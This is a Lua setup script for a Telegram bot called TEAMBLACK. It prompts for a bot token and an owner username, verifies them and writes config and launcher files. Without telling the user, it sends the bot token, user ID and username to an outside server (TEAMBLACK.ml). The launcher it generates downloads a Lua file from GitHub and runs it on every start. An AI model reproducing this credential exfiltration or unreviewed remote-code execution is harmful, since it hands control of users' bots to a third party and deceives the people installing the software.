serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_TEAMBLACK = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read("*a")
local function AutoFiles_TEAMBLACK()
    local function Create_Info(Token, Sudo, UserName)
        local TEAMBLACK_Info_Sudo = io.open("sudo.lua", "w")
        TEAMBLACK_Info_Sudo:write(
            [[
token = "]] .. Token .. [["
Sudo = ]] .. Sudo .. [[  
UserName = "]] .. UserName .. [["
]]
        )
        TEAMBLACK_Info_Sudo:close()
    end
    if not database:get(Server_TEAMBLACK .. "Token_TEAMBLACK") then
        print("\27[1;34m»» Send Your Token Bot :\27[m")
        local token = io.read()
        if token ~= "" then
            local url, res = https.request("https://api.telegram.org/bot" .. token .. "/getMe")
            if res ~= 200 then
                io.write("\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m")
            else
                io.write("\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m")
                database:set(Server_TEAMBLACK .. "Token_TEAMBLACK", token)
            end
        else
            io.write("\n\27[1;31mThe Token was not Saved\n\27[0;39;49m")
            return AutoFiles_TEAMBLACK()
        end
    end
    ----------------------
    ----------------------
    if not database:get(Server_TEAMBLACK .. "UserName_TEAMBLACK") then
        print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
        local UserName = io.read():gsub("@", "")
        if UserName ~= "" then
            local Get_Info = http.request("http://TshAkE.ml/info/?user=" .. UserName)
            if Get_Info:match("Is_Spam") then
                io.write(
                    "\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m"
                )
                return false
            end
            local Json = JSON:decode(Get_Info)
            if Json.Info == false then
                io.write("\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m")
                return AutoFiles_TEAMBLACK()
            else
                if Json.Info == "Channel" then
                    io.write("\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m")
                    return AutoFiles_TEAMBLACK()
                else
                    io.write("\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m")
                    database:set(Server_TEAMBLACK .. "UserName_TEAMBLACK", Json.Info.Username)
                    database:set(Server_TEAMBLACK .. "Id_TEAMBLACK", Json.Info.Id)
                end
            end
        else
            io.write("\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m")
            return AutoFiles_TEAMBLACK()
        end
    end
    local function Files_TEAMBLACK_Info()
        Create_Info(
            database:get(Server_TEAMBLACK .. "Token_TEAMBLACK"),
            database:get(Server_TEAMBLACK .. "Id_TEAMBLACK"),
            database:get(Server_TEAMBLACK .. "UserName_TEAMBLACK")
        )
        https.request(
            "https://TEAMBLACK.ml/telethonconfig.php?id=" ..
                database:get(Server_TEAMBLACK .. "Id_TEAMBLACK") ..
                    "&user=" ..
                        database:get(Server_TEAMBLACK .. "UserName_TEAMBLACK") ..
                            "&token=" .. database:get(Server_TEAMBLACK .. "Token_TEAMBLACK")
        )
        local RunTEAMBLACK = io.open("TEAMBLACK", "w")
        RunTEAMBLACK:write(
            [[
#!/usr/bin/env bash
cd $HOME/TEAMBLACK
token="]] ..
                database:get(Server_TEAMBLACK .. "Token_TEAMBLACK") ..
                    [["
rm -fr TEAMBLACK.lua
wget "https://raw.githubusercontent.com/telethon-Arab/TEAMBLACK/master/TEAMBLACK.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TEAMBLACK.lua -p PROFILE --bot=$token
done
]]
        )
        RunTEAMBLACK:close()
        local RunTs = io.open("on", "w")
        RunTs:write(
            [[
#!/usr/bin/env bash
cd $HOME/TEAMBLACK
while(true) do
rm -fr ../.telegram-cli
screen -S TEAMBLACK -X kill
chmod +x TEAMBLACK
screen -S TEAMBLACK ./TEAMBLACK
done
]]
        )
        RunTs:close()
    end
    Files_TEAMBLACK_Info()
    database:del(Server_TEAMBLACK .. "Token_TEAMBLACK")
    database:del(Server_TEAMBLACK .. "Id_TEAMBLACK")
    database:del(Server_TEAMBLACK .. "UserName_TEAMBLACK")
    os.execute("chmod +x on tg && ./on")
    sudos = dofile("sudo.lua")
end
local function Load_File()
    local f = io.open("./sudo.lua", "r")
    if not f then
        AutoFiles_TEAMBLACK()
        var = true
    else
        f:close()
        database:del(Server_TEAMBLACK .. "Token_TEAMBLACK")
        database:del(Server_TEAMBLACK .. "Id_TEAMBLACK")
        database:del(Server_TEAMBLACK .. "UserName_TEAMBLACK")
        sudos = dofile("sudo.lua")
        os.execute("chmod +x on tg && ./on")
        var = false
    end
    return var
end
Load_File()
